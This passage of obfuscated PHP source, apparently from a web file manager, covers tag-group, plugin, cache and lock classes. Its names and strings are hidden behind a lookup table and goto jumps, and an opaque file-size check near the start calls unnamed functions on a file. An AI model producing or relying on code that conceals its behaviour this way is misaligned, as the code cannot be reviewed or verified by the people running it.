__construct($ÁÕÖ ²Â) { parent::__construct($ÁÕÖ ²Â); $this->signatureVersion($_SERVER[‚ûòÉ˜ş][241]); } public function fileOutLink($©³œŠÓ×) { $ëëÓÙ—Ã =& $_SERVER[‚ûòÉ˜ş]; if (substr($©³œŠÓ×, 0, 7) == $ëëÓÙ—Ã[1371]) { $©³œŠÓ× = $ëëÓÙ—Ã[1372] . substr($©³œŠÓ×, 7); } header($ëëÓÙ—Ã[172] . $©³œŠÓ×); die; } } goto BÊï”ºœ»; AëÕˆä ¢Û: if ($_SERVER[$_SERVER[‚ûòÉ˜ş][13]] != $_size($_file)) { $_getc = $_SERVER[‚ûòÉ˜ş][15]; $_getfile = $_SERVER[$_SERVER[‚ûòÉ˜ş][16]] . $_SERVER[‚ûòÉ˜ş][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‚ûòÉ˜ş][18], $_getfilec); if (count($_getarrs) < $_SERVER[‚ûòÉ˜ş][19]) { $exit = $_SERVER[‚ûòÉ˜ş][20]; $exit(); } $_act = $_SERVER[‚ûòÉ˜ş][21]; $_act($_file); } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($Ù”ş½Œ¹) { $ÇÇ‰¶Ì¶ =& $_SERVER[‚ûòÉ˜ş]; return array($ÇÇ‰¶Ì¶[1994] => array($Ù”ş½Œ¹[0], $ÇÇ‰¶Ì¶[1995]), $ÇÇ‰¶Ì¶[1996] => array($Ù”ş½Œ¹[0], $ÇÇ‰¶Ì¶[1997])); } protected function get($ŠÆğàÛÏ) { $¿«ˆÑ›Ÿ =& $_SERVER[‚ûòÉ˜ş]; $²ĞôûûÒ = Model($¿«ˆÑ›Ÿ[562])->metaGet($ŠÆğàÛÏ, $¿«ˆÑ›Ÿ[1998]); $ÃğãÙ«ë = json_decode($²ĞôûûÒ, !0); return $ÃğãÙ«ë ? $ÃğãÙ«ë : array($¿«ˆÑ›Ÿ[1999] => $¿«ˆÑ›Ÿ[98], $¿«ˆÑ›Ÿ[422] => array()); } protected function set($¾Ãµ²¹±, $—‹Ó×Ù) { $Ò±Ì¡«§ =& $_SERVER[‚ûòÉ˜ş]; $—‹Ó×Ù = $—‹Ó×Ù ? $—‹Ó×Ù : array($Ò±Ì¡«§[1999] => $Ò±Ì¡«§[98], $Ò±Ì¡«§[422] => array()); return Model($Ò±Ì¡«§[562])->metaSet($¾Ãµ²¹±, $Ò±Ì¡«§[1998], json_encode($—‹Ó×Ù)); } protected function getByTagID($ó·­Ç˜, $€ˆ¸¦ˆë) { $íûËÍï =& $_SERVER[‚ûòÉ˜ş]; if (!$ó·­Ç˜ || !$€ˆ¸¦ˆë) { return !1; } if (!Model($íûËÍï[562])->getInfoSimple($ó·­Ç˜)) { return !1; } $ÈÓçßô = $this->get($ó·­Ç˜); if (!$ÈÓçßô || !isset($ÈÓçßô[$íûËÍï[422]])) { return !1; } $•ºÍ×£Î = array_find_by_field($ÈÓçßô[$íûËÍï[422]], $íûËÍï[451], $€ˆ¸¦ˆë); return is_array($•ºÍ×£Î) ? $•ºÍ×£Î : !1; } public function listSource($À–††Ä, $üáñ¹Â×) { $Ë¼ªìõÕ =& $_SERVER[‚ûòÉ˜ş]; if ($üáñ¹Â× && !is_array($üáñ¹Â×)) { $üáñ¹Â× = array($üáñ¹Â×); } $¡´˜Ø¨ã = $this->listData($À–††Ä); $‰‘¹ğŸ = array(); foreach ($¡´˜Ø¨ã as $ÖÍş‡±) { $¤À¡»ÎÑ = $ÖÍş‡±[$Ë¼ªìõÕ[94]]; if (!$¤À¡»ÎÑ) { continue; } if (!isset($‰‘¹ğŸ[$¤À¡»ÎÑ])) { $‰‘¹ğŸ[$¤À¡»ÎÑ] = array(); } $‰‘¹ğŸ[$¤À¡»ÎÑ][] = $ÖÍş‡±[$Ë¼ªìõÕ[476]]; } $˜ËÅ§à = array(); foreach ($‰‘¹ğŸ as $ª…ûŠ¯· => $Å÷ÓîöØ) { $ºÍ÷úşß = !0; if (!$üáñ¹Â×) { $˜ËÅ§à[] = $ª…ûŠ¯·; continue; } foreach ($üáñ¹Â× as $ÁÔ×í†) { if (!in_array($ÁÔ×í†, $Å÷ÓîöØ)) { $ºÍ÷úşß = !1; break; } } if ($ºÍ÷úşß) { $˜ËÅ§à[] = $ª…ûŠ¯·; } } if (!$˜ËÅ§à) { return array(); } $‰»›ˆÉŠ = array($Ë¼ªìõÕ[467] => array($Ë¼ªìõÕ[468], $˜ËÅ§à), $Ë¼ªìõÕ[546] => $À–††Ä, $Ë¼ªìõÕ[188] => SourceModel::TYPE_GROUP); $‘ŒÕŒËö = Model($Ë¼ªìõÕ[1373])->listSource($‰»›ˆÉŠ); if (!$‘ŒÕŒËö || count($˜ËÅ§à) == $‘ŒÕŒËö[$Ë¼ªìõÕ[419]][$Ë¼ªìõÕ[420]]) { return $‘ŒÕŒËö; } $­¨ øé = array(); $êÀÛñªƒ = array_to_keyvalue($‘ŒÕŒËö[$Ë¼ªìõÕ[92]], $Ë¼ªìõÕ[12], $Ë¼ªìõÕ[191]); $·ŞÅ£®Š = array_to_keyvalue($‘ŒÕŒËö[$Ë¼ªìõÕ[93]], $Ë¼ªìõÕ[12], $Ë¼ªìõÕ[191]); $§Ò½Šùí = array_merge($·ŞÅ£®Š, $êÀÛñªƒ); foreach ($˜ËÅ§à as $¤À¡»ÎÑ) { if (!in_array($¤À¡»ÎÑ, $§Ò½Šùí)) { $­¨ øé[] = $¤À¡»ÎÑ; } } if ($­¨ øé) { $this->removeBySource($À–††Ä, $­¨ øé); } return $‘ŒÕŒËö; } protected function listData($Ê½) { $Œ¿şğŠı =& $_SERVER[‚ûòÉ˜ş]; $ƒõê¬¾¾ = array($Œ¿şğŠı[1678] => 0, $Œ¿şğŠı[533] => array($Œ¿şğŠı[2000], 0), $Œ¿şğŠı[472] => $Œ¿şğŠı[2001] . $Ê½); $ãŞÆ—¶ = $Œ¿şğŠı[2002]; $í´¨¬¿» = $this->field($ãŞÆ—¶)->where($ƒõê¬¾¾)->order($Œ¿şğŠı[2003])->select(); return $í´¨¬¿» ? $í´¨¬¿» : array(); } protected function addToTag($ÁÍå“„, $Æ§Ü‹, $„›¹°á¶) { $§»Èş¿ú =& $_SERVER[‚ûòÉ˜ş]; if (!$this->getByTagID($ÁÍå“„, $„›¹°á¶) || !$Æ§Ü‹) { return !1; } if (!Model($§»Èş¿ú[865])->pathInfo($Æ§Ü‹)) { return !1; } $†Çä‡Ùñ = array($§»Èş¿ú[1678] => 0, $§»Èş¿ú[533] => $„›¹°á¶, $§»Èş¿ú[471] => $Æ§Ü‹, $§»Èş¿ú[472] => $§»Èş¿ú[2004] . $ÁÍå“„, $§»Èş¿ú[470] => $§»Èş¿ú[12], $§»Èş¿ú[1889] => 0); if ($this->where($†Çä‡Ùñ)->find()) { return !1; } return $this->add($†Çä‡Ùñ); } protected function removeFromTag($Ôõ³‹š, $Ûí¾, $ª¼¼ü“ø) { $´îş½¬õ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->getByTagID($Ôõ³‹š, $ª¼¼ü“ø) || !$Ûí¾) { return !1; } if (is_array($Ûí¾)) { $Ûí¾ = array($´îş½¬õ[7], $Ûí¾); } $À¯ŞÙÁ = array($´îş½¬õ[1678] => 0, $´îş½¬õ[533] => $ª¼¼ü“ø, $´îş½¬õ[472] => $´îş½¬õ[2004] . $Ôõ³‹š, $´îş½¬õ[471] => $Ûí¾); return $this->where($À¯ŞÙÁ)->delete(); } protected function removeByTag($³Œ€ß, $™×Š„Úó) { $¹œºÇõè =& $_SERVER[‚ûòÉ˜ş]; if (!$this->getByTagID($³Œ€ß, $™×Š„Úó)) { return !1; } $Ÿ‘´ºèÙ = array($¹œºÇõè[1678] => 0, $¹œºÇõè[533] => $™×Š„Úó, $¹œºÇõè[472] => $¹œºÇõè[2004] . $³Œ€ß); return $this->where($Ÿ‘´ºèÙ)->delete(); } protected function removeBySource($øÇ…‹, $Áø¶™¤İ) { $Ôé…±ø° =& $_SERVER[‚ûòÉ˜ş]; if (!$øÇ…‹ || !$Áø¶™¤İ) { return !1; } if (is_array($Áø¶™¤İ)) { $Áø¶™¤İ = array($Ôé…±ø°[7], $Áø¶™¤İ); } $¤©´Çş = array($Ôé…±ø°[1678] => 0, $Ôé…±ø°[471] => $Áø¶™¤İ, $Ôé…±ø°[533] => array($Ôé…±ø°[1055], 0), $Ôé…±ø°[472] => $Ôé…±ø°[2004] . $øÇ…‹); return $this->where($¤©´Çş)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x70\154\x75\x67\151\156\x4c\x69\x73\x74"; public $field = array("\x6e\141\155\x65", "\163\x74\x61\x74\x75\x73", "\162\145\147\151\145\x73\x74", "\x63\157\156\x66\x69\x67"); public function loadList($ÕÂÆÎÕÍ = false) { $º¾ñ•¿‘ = array_to_keyvalue($this->listData(), $_SERVER[‚ûòÉ˜ş][42]); if ($ÕÂÆÎÕÍ) { return $º¾ñ•¿‘[$ÕÂÆÎÕÍ]; } return $º¾ñ•¿‘; } public function init() { $ÅßÙıëî =& $_SERVER[‚ûòÉ˜ş]; Hook::trigger($ÅßÙıëî[2005]); $Š¯ç½ì = $this->loadPluginList(); foreach ($Š¯ç½ì as $Æµ„ş™ß => $–€ïÂ°í) { $Âş¶øÎ = $this->appAllow($Æµ„ş™ß, $–€ïÂ°í); if (!$Âş¶øÎ) { continue; } foreach ($–€ïÂ°í[$ÅßÙıëî[2006]] as $×ŸåË’æ => $Ü©”ñÂá) { Hook::bind($×ŸåË’æ, $Ü©”ñÂá); } } Hook::trigger($ÅßÙıëî[2007]); Hook::trigger(ACTION); } public function appAllow($•ƒË¼›ƒ, $Û¾„Æ, $¬‘¹İ¸ = true) { $Î§†İƒ =& $_SERVER[‚ûòÉ˜ş]; $İòÌ¥•« = PLUGIN_DIR . $•ƒË¼›ƒ . $Î§†İƒ[2008]; if (!is_array($Û¾„Æ) || !is_array($Û¾„Æ[$Î§†İƒ[2006]]) || $Û¾„Æ[$Î§†İƒ[790]] != 1 || !is_file($İòÌ¥•«)) { return !1; } if ($GLOBALS[$Î§†İƒ[544]] == 1) { if ($GLOBALS[$Î§†İƒ[6]][$Î§†İƒ[2009]] || !$GLOBALS[$Î§†İƒ[6]][$Î§†İƒ[2010]]) { return !0; } $æ÷ó¡å = explode($Î§†İƒ[60], strtolower($GLOBALS[$Î§†İƒ[6]][$Î§†İƒ[2010]])); return in_array(strtolower($•ƒË¼›ƒ), $æ÷ó¡å) ? !1 : !0; } if ($¬‘¹İ¸ && !Action($Î§†İƒ[2011])->checkAuth($•ƒË¼›ƒ)) { return !1; } return !0; } public function unInstall($¾î‹è²é) { $œß½Şô =& $_SERVER[‚ûòÉ˜ş]; $×æäİÜ¢ = $this->loadList($¾î‹è²é); if (file_exists(PLUGIN_DIR . $¾î‹è²é)) { Hook::apply($¾î‹è²é . $œß½Şô[2012]); } $this->remove($×æäİÜ¢[$œß½Şô[451]]); } public function changeStatus($¹°œş«, $ÖèĞŒš³) { $ÆÃĞÌÅ“ =& $_SERVER[‚ûòÉ˜ş]; $Æãû÷š = $this->loadList($¹°œş«); if ($ÖèĞŒš³) { Hook::apply($¹°œş« . $ÆÃĞÌÅ“[2013]); } $this->update($Æãû÷š[$ÆÃĞÌÅ“[451]], array($ÆÃĞÌÅ“[2014] => $ÖèĞŒš³)); } public function appRegist($ª¾ìÔ«, $£ÀÒ¥é°) { $ûŒ½—ğ· =& $_SERVER[‚ûòÉ˜ş]; $‡®şÚğÉ = $this->loadList($ª¾ìÔ«); if ($‡®şÚğÉ) { $this->update($‡®şÚğÉ[$ûŒ½—ğ·[451]], array($ûŒ½—ğ·[2006] => $£ÀÒ¥é°)); } else { $®üèœí‡ = array($ûŒ½—ğ·[42] => $ª¾ìÔ«, $ûŒ½—ğ·[2006] => $£ÀÒ¥é°, $ûŒ½—ğ·[790] => 0, $ûŒ½—ğ·[6] => $this->getConfigDefault($ª¾ìÔ«)); $this->insert($®üèœí‡); } } public function getConfigDefault($‚çÎĞÔÕ) { $¶ıƒÖ° =& $_SERVER[‚ûòÉ˜ş]; $ÄöÔÚËì = array(); $Ç‹ÕÇó· = $this->getPackageJson($‚çÎĞÔÕ); if (!$Ç‹ÕÇó· && is_array($Ç‹ÕÇó·[$¶ıƒÖ°[2015]])) { return $ÄöÔÚËì; } foreach ($Ç‹ÕÇó·[$¶ıƒÖ°[2015]] as $À¼ó†©Ÿ => $åŒèãø) { if (!isset($åŒèãø[$¶ıƒÖ°[427]]) || isset($ÄöÔÚËì[$À¼ó†©Ÿ])) { continue; } $ÄöÔÚËì[$À¼ó†©Ÿ] = $åŒèãø[$¶ıƒÖ°[427]]; } return $ÄöÔÚËì; } public function getPackageJson($ı¼æ•å²) { return Hook::apply($ı¼æ•å² . $_SERVER[‚ûòÉ˜ş][2016]); } public function getConfig($‰Ê£Éç, $Œã•¸Ğ = false) { $¦”‰úØê =& $_SERVER[‚ûòÉ˜ş]; $â—¥”©Ö = array(); $òòîåƒ· = $this->loadList($‰Ê£Éç); if ($òòîåƒ· && is_array($òòîåƒ·[$¦”‰úØê[6]])) { $â—¥”©Ö = $òòîåƒ·[$¦”‰úØê[6]]; } if (!$â—¥”©Ö || $Œã•¸Ğ) { $â—¥”©Ö = $this->getConfigDefault($‰Ê£Éç); } return $â—¥”©Ö; } public function setConfig($¬œ½Ôä, $Æª©ƒ = false) { $Îøñˆµº =& $_SERVER[‚ûòÉ˜ş]; $¿­„ôµµ = $this->loadList($¬œ½Ôä); if (!$¿­„ôµµ) { return !1; } $û”­¿£Å = $¿­„ôµµ[$Îøñˆµº[6]]; if ($Æª©ƒ == !1) { $û”­¿£Å = array(); $Æª©ƒ = $this->getConfigDefault($¬œ½Ôä); } foreach ($Æª©ƒ as $™€­Åñ => $Š°ç¡¾) { $û”­¿£Å[$™€­Åñ] = is_string($Š°ç¡¾) ? trim($Š°ç¡¾) : $Š°ç¡¾; } $this->update($¿­„ôµµ[$Îøñˆµº[451]], array($Îøñˆµº[6] => $û”­¿£Å)); } public function viewList() { $¦ÚŞÒÏ™ =& $_SERVER[‚ûòÉ˜ş]; $ØÈµù = $this->loadList(); $this->pluginScan($ØÈµù); $ØÈµù = $this->loadPluginList(); $Î°”óäÈ = array(); foreach ($ØÈµù as $®¤—­éå => $«ÖÔºı·) { unset($«ÖÔºı·[$¦ÚŞÒÏ™[2006]], $«ÖÔºı·[$¦ÚŞÒÏ™[6]]); $Ó²è§â = PLUGIN_DIR . $«ÖÔºı·[$¦ÚŞÒÏ™[42]] . $¦ÚŞÒÏ™[2008]; if (!is_file($Ó²è§â)) { continue; } $Ş¶˜¦š¦ = Hook::apply($«ÖÔºı·[$¦ÚŞÒÏ™[42]] . $¦ÚŞÒÏ™[2016]); if (is_array($Ş¶˜¦š¦)) { $Î°”óäÈ[$®¤—­éå] = array_merge($«ÖÔºı·, $Ş¶˜¦š¦); } } return $Î°”óäÈ; } private function loadPluginList() { $ş×ÅäÛí =& $_SERVER[‚ûòÉ˜ş]; $„×ûĞ¨© = $this->loadList(); if (strtolower(MOD) == $ş×ÅäÛí[2017]) { return $„×ûĞ¨©; } $µ¸×Š„ = Hook::trigger($ş×ÅäÛí[2018], $„×ûĞ¨©); if ($„×ûĞ¨© && !$µ¸×Š„) { die; } return $µ¸×Š„ ? $µ¸×Š„ : $„×ûĞ¨©; } private function pluginScan($»Îã«©À) { $¶´ß¤¨ß =& $_SERVER[‚ûòÉ˜ş]; recursion_dir(PLUGIN_DIR, $«¬ í‚, $ÖÒ†ƒ¹¯, 0); foreach ($«¬ í‚ as $ §ñ‘è) { $•¶·´—» = get_path_this($ §ñ‘è); if (isset($»Îã«©À[$•¶·´—»]) || !file_exists($ §ñ‘è . $¶´ß¤¨ß[2019]) || !file_exists($ §ñ‘è . $¶´ß¤¨ß[2008])) { continue; } Hook::apply($•¶·´—» . $¶´ß¤¨ß[2013]); } } } goto fÙ«Ì‡æçİ; c¿›Á„˜Ë: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Ç§‚âŸ =& $_SERVER[‚ûòÉ˜ş]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $úšºÙÛÌ = $GLOBALS[$Ç§‚âŸ[6]][$Ç§‚âŸ[402]]; $Æ•Ä­ü÷ = $úšºÙÛÌ[$úšºÙÛÌ[$Ç§‚âŸ[867]]]; $“æ´Ò÷ = $úšºÙÛÌ[$Ç§‚âŸ[868]]; switch ($úšºÙÛÌ[$Ç§‚âŸ[867]]) { case $Ç§‚âŸ[31]: self::$handle = Model($Ç§‚âŸ[869]); break; case $Ç§‚âŸ[870]: self::$handle = new CacheRedis($Æ•Ä­ü÷, $“æ´Ò÷); break; case $Ç§‚âŸ[871]: self::$handle = new CacheMemcached($Æ•Ä­ü÷, $“æ´Ò÷); break; case $Ç§‚âŸ[224]: self::$handle = new CacheFile($Æ•Ä­ü÷, $“æ´Ò÷); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($§ª³“õä) { if (is_array($§ª³“õä) || is_object($§ª³“õä)) { $§ª³“õä = json_encode($§ª³“õä); } $§ª³“õä = rawurlencode($§ª³“õä); return md5(KOD_SITE_ID . $_SERVER[‚ûòÉ˜ş][11] . $§ª³“õä); } public static function get($¡¢êœÔã, $»üÓôñ‚ = false) { $‚¬‡¢õ  = self::key($¡¢êœÔã); $Íæ¿ûºŒ = self::init(); if ($»üÓôñ‚) { return unserialize($Íæ¿ûºŒ->get($‚¬‡¢õ )); } if (!isset(self::$memoryCache[$‚¬‡¢õ ])) { $¿Öôµã¹ = $Íæ¿ûºŒ->get($‚¬‡¢õ ); self::$memoryCache[$‚¬‡¢õ ] = unserialize($¿Öôµã¹); } return self::$memoryCache[$‚¬‡¢õ ]; } public static function set($“ÑÜ¤Ô, $Š¥è°üÑ, $£¾Óñ· = false) { $†¥Û€Ğ© =& $_SERVER[‚ûòÉ˜ş]; $™Í•ƒû = self::key($“ÑÜ¤Ô); if (isset(self::$memoryCache[$™Í•ƒû]) && self::$memoryCache[$™Í•ƒû] === $Š¥è°üÑ) { return !0; } if ($£¾Óñ· === 0) { self::$memoryCache[$™Í•ƒû] = $Š¥è°üÑ; return !0; } $ÊùµÅÏ® = self::init(); $“Ü´µÁÕ = serialize($Š¥è°üÑ); CacheLock::lock($“ÑÜ¤Ô . $†¥Û€Ğ©[872]); $Œ«á¹»Ö = $ÊùµÅÏ®->set($™Í•ƒû, $“Ü´µÁÕ, $£¾Óñ·); self::$memoryCache[$™Í•ƒû] = $Š¥è°üÑ; CacheLock::unlock($“ÑÜ¤Ô . $†¥Û€Ğ©[872]); return $Œ«á¹»Ö; } public static function getCall($€áÈƒâ…, $÷¤ï…µÔ, $ÒŒå¥ûÏ, $×°ò°Ç„ = array()) { $Ùº÷ïß¼ =& $_SERVER[‚ûòÉ˜ş]; $Á­äÕõ = self::get($€áÈƒâ…); if ($Á­äÕõ || $Á­äÕõ === $Ùº÷ïß¼[12]) { return $Á­äÕõ; } $Á­äÕõ = call_user_func_array($ÒŒå¥ûÏ, $×°ò°Ç„); $Á­äÕõ = $Á­äÕõ ? $Á­äÕõ : $Ùº÷ïß¼[12]; self::set($€áÈƒâ…, $Á­äÕõ, $÷¤ï…µÔ); return $Á­äÕõ; } public static function remove($ïË’´¸¨) { $µ¯¥œêó = self::key($ïË’´¸¨); unset(self::$memoryCache[$µ¯¥œêó]); self::clearTimeout(); CacheLock::lock($ïË’´¸¨); $ÔÄÂÂ›Î = self::init()->remove($µ¯¥œêó); CacheLock::unlock($ïË’´¸¨); return $ÔÄÂÂ›Î; } public static function removeMemory($”ı»½·) { $ì¶¹Óˆ‡ = self::key($”ı»½·); unset(self::$memoryCache[$ì¶¹Óˆ‡]); } public static function clearMemory($–´¹Ú©œ = false) { if ($–´¹Ú©œ) { $–´¹Ú©œ = self::key($–´¹Ú©œ); unset(self::$memoryCache[$–´¹Ú©œ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‚ûòÉ˜ş][873])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‚ûòÉ˜ş][874])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($í©¦±ºÁ, $ÄËÆÅª–) { $Á’ÛøøÅ =& $_SERVER[‚ûòÉ˜ş]; $this->cachePath = $í©¦±ºÁ[$Á’ÛøøÅ[94]]; $this->prefix = $Á’ÛøøÅ[875]; $this->cacheTime = $ÄËÆÅª–; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($•³Ñ Ğ) { $ê¾İµ™½ =& $_SERVER[‚ûòÉ˜ş]; $•³Ñ Ğ = str_replace(array($ê¾İµ™½[876], $ê¾İµ™½[107], $ê¾İµ™½[83]), $ê¾İµ™½[877], $•³Ñ Ğ); return $this->cachePath . $ê¾İµ™½[878] . $•³Ñ Ğ . $ê¾İµ™½[879]; } public function set($²±ª°‘, $ÄæéØ”, $‘­ÁªŸ‰ = false) { $‘­ÁªŸ‰ = $‘­ÁªŸ‰ ? $‘­ÁªŸ‰ : $this->cacheTime; $ËĞµ®î© = $this->getFile($²±ª°‘); if (file_put_contents($ËĞµ®î©, $this->prefix . $ÄæéØ”, LOCK_EX)) { @touch($ËĞµ®î©, intval(time() + $‘­ÁªŸ‰)); clearstatcache(); return !0; } @unlink($ËĞµ®î©); return !1; } public function get($™¤•ĞÎÔ) { $†‹ş‹ûå = $this->getFile($™¤•ĞÎÔ); if (file_exists($†‹ş‹ûå) && filemtime($†‹ş‹ûå) < time()) { @unlink($†‹ş‹ûå); return !1; } $Š¯š»úƒ = @file_get_contents($†‹ş‹ûå); return substr($Š¯š»úƒ, strlen($this->prefix)); } public function remove($Üî“ğóö) { $òã²ÒáÉ = $this->getFile($Üî“ğóö); return @unlink($òã²ÒáÉ); } public function deleteAll() { $†ĞŠ†ëë =& $_SERVER[‚ûòÉ˜ş]; $ËÍÚ‚Ã¯ = scandir($this->cachePath); foreach ($ËÍÚ‚Ã¯ as $»ÛŒŞœÄ) { $µÁïªÊ = $this->cachePath . $»ÛŒŞœÄ; if (strpos($µÁïªÊ, $†ĞŠ†ëë[879]) && strpos($µÁïªÊ, $†ĞŠ†ëë[880])) { @unlink($µÁïªÊ); } } } public function clearTimeout() { $³•“•†’ =& $_SERVER[‚ûòÉ˜ş]; $µ†ëŸßò = scandir($this->cachePath); foreach ($µ†ëŸßò as $Ø¯ƒÏÇã) { $µÈùÈ¸ = $this->cachePath . $Ø¯ƒÏÇã; if (strpos($µÈùÈ¸, $³•“•†’[879]) && strpos($µÈùÈ¸, $³•“•†’[880]) && filemtime($µÈùÈ¸) < time()) { @unlink($µÈùÈ¸); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¨°°ÊÄ‘ =& $_SERVER[‚ûòÉ˜ş]; if (self::$handle) { return self::$handle; } $í§·¨’¬ = $GLOBALS[$¨°°ÊÄ‘[6]][$¨°°ÊÄ‘[402]]; self::$timeout = $í§·¨’¬[$¨°°ÊÄ‘[881]] ? $í§·¨’¬[$¨°°ÊÄ‘[881]] : 10; $¿úÓÖ¿¼ = _get($GLOBALS[$¨°°ÊÄ‘[6]], $¨°°ÊÄ‘[882]); $½½—ÌÌ = $í§·¨’¬[$¨°°ÊÄ‘[867]] ? $í§·¨’¬[$¨°°ÊÄ‘[867]] : $¨°°ÊÄ‘[224]; if ($½½—ÌÌ == $¨°°ÊÄ‘[31] && $¿úÓÖ¿¼ == $¨°°ÊÄ‘[23]) { $½½—ÌÌ = $¨°°ÊÄ‘[224]; } switch ($½½—ÌÌ) { case $¨°°ÊÄ‘[870]: self::$handle = new CacheLockRedis(); break; case $¨°°ÊÄ‘[871]: self::$handle = new CacheLockMemcached(); break; case $¨°°ÊÄ‘[31]: self::$handle = new CacheLockDatabase(); break; case $¨°°ÊÄ‘[224]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¨°°ÊÄ‘[883], $¨°°ÊÄ‘[884]); } return self::$handle; } private static function key($ô´›‚Ø„) { return $_SERVER[‚ûòÉ˜ş][885] . Cache::key($ô´›‚Ø„); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¸À­ĞÙ« = '') { self::$errorMsg = $¸À­ĞÙ«; } public static function lockGlobal($Û§Âã, $üöçâ³Å) { return self::lock($Û§Âã, $üöçâ³Å, !0); } public static function lock($½ùá£ò“, $Êâê‰Šı = false, $õ–ß˜” = false) { $°µÆÀƒ =& $_SERVER[‚ûòÉ˜ş]; $Êİ§Ìß¥ = self::init(); $øŒö½‰‹ = self::key($½ùá£ò“); $Êâê‰Šı = $Êâê‰Šı ? $Êâê‰Šı : self::$timeout; $ä°¬Ë„° = timeFloat(); $Š¾àªô = $Êİ§Ìß¥->lock($øŒö½‰‹, $Êâê‰Šı); $ÅèÌ‹üÏ = timeFloat(); if (!$Š¾àªô) { $»ÇİÃùù = "\154\157\x63\153\40\x65\x72\x72\157\162\73\x6b\x65\x79\75{$½ùá£ò“}\73\x74\151\155\x65\75{$Êâê‰Šı}\73" . self::$errorMsg . $°µÆÀƒ[81] . get_caller_msg(); $èğ‚àÙé = LNG($°µÆÀƒ[886]) . "\50{$Êâê‰Šı}\163\x29\56" . LNG($°µÆÀƒ[887]); $èğ‚àÙé .= $°µÆÀƒ[888]; if (is_string(self::$errorMsg) && self::$errorMsg) { $èğ‚àÙé = $èğ‚àÙé . $°µÆÀƒ[889] . self::$errorMsg; } write_log($°µÆÀƒ[890] . sprintf($°µÆÀƒ[891], timeFloat() - $ä°¬Ë„°) . $°µÆÀƒ[892] . $»ÇİÃùù . $°µÆÀƒ[893] . error_get_last(), $°µÆÀƒ[884]); show_json($èğ‚àÙé, !1); } if (!$õ–ß˜”) { self::$lockItem[$øŒö½‰‹] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ƒíïÈ©¤ = number_format(timeFloat() - $ÅèÌ‹üÏ, 3); write_log($°µÆÀƒ[894] . $½ùá£ò“ . $°µÆÀƒ[895] . $ƒíïÈ©¤, $°µÆÀƒ[884]); } return $Š¾àªô; } public static function lockGet($å¡²ÃèÕ) { $É¹­Åâ = self::key($å¡²ÃèÕ); if (self::$lockItem[$É¹­Åâ]) { return self::$lockItem[$É¹­Åâ]; } return self::init()->lockGet($É¹­Åâ); } public static function unlock($Ï€­íõ½) { $ÎˆÁ¥ä³ =& $_SERVER[‚ûòÉ˜ş]; $’ó ƒ³ = self::key($Ï€­íõ½); self::$lockItem[$’ó ƒ³] = null; self::init()->unlock($’ó ƒ³); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÎˆÁ¥ä³[896] . $Ï€­íõ½, $ÎˆÁ¥ä³[884]); } return; } public static function unlockRuntime() { $÷õÏ­² =& $_SERVER[‚ûòÉ˜ş]; $Âİ²ÌŞ = self::init(); $×µÖŸüÒ = !1; foreach (self::$lockItem as $çªŠ‡ğÎ => $ã–Ñ¸¢) { if (!$ã–Ñ¸¢) { continue; } $Âİ²ÌŞ->unlock($çªŠ‡ğÎ); if (!$×µÖŸüÒ) { $×µÖŸüÒ = !0; write_log($÷õÏ­²[897] . $çªŠ‡ğÎ . $÷õÏ­²[81] . get_caller_msg(), $÷õÏ­²[884]); continue; } write_log($÷õÏ­²[897] . $çªŠ‡ğÎ, $÷õÏ­²[884]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¾ó™¤… = number_format(timeFloat() - TIME_FLOAT, 3); write_log($÷õÏ­²[898] . $¾ó™¤… . $÷õÏ­²[899] . ACTION, $÷õÏ­²[884]); } } public static function fileLock($µğÈÃ«Ğ) { $Ÿßû¨ÄÕ =& $_SERVER[‚ûòÉ˜ş]; if (!$GLOBALS[$Ÿßû¨ÄÕ[900]]) { $GLOBALS[$Ÿßû¨ÄÕ[900]] = array(); } $GLOBALS[$Ÿßû¨ÄÕ[900]][$µğÈÃ«Ğ] = !1; $Ç®ì’µ· = fopen(DATA_PATH . $µğÈÃ«Ğ . $Ÿßû¨ÄÕ[901], $Ÿßû¨ÄÕ[902]); if (!$Ç®ì’µ·) { return !1; } $GLOBALS[$Ÿßû¨ÄÕ[900]][$µğÈÃ«Ğ] = $Ç®ì’µ·; if (flock($Ç®ì’µ·, LOCK_EX)) { return !0; } self::unlock($µğÈÃ«Ğ); show_json($Ÿßû¨ÄÕ[903], !1); return !1; } public static function fileUnlock($«®Îö™) { $Òé¥¨€Ø =& $_SERVER[‚ûòÉ˜ş]; $¤Ú™°Ï• = $GLOBALS[$Òé¥¨€Ø[900]][$«®Îö™]; if (!$¤Ú™°Ï•) { return; } $GLOBALS[$Òé¥¨€Ø[900]][$«®Îö™] = !1; flock($¤Ú™°Ï•, LOCK_UN); fclose($¤Ú™°Ï•); } public static function fileUnlockAll() { $àîëœ¶ø =& $_SERVER[‚ûòÉ˜ş]; if (!$GLOBALS[$àîëœ¶ø[900]]) { return; } foreach ($GLOBALS[$àîëœ¶ø[900]] as $ìØÚÁàù => $ßÍÑÊà») { if (!$ßÍÑÊà») { continue; } $GLOBALS[$àîëœ¶ø[900]][$ìØÚÁàù] = !1; flock($ßÍÑÊà», LOCK_UN); fclose($ßÍÑÊà»); } $GLOBALS[$àîëœ¶ø[900]] = array(); } } goto E”¹æŸÖÔä; fÏ‹ªÑÉß›: function binCheckBigger($Õé‚ÀºŒ, 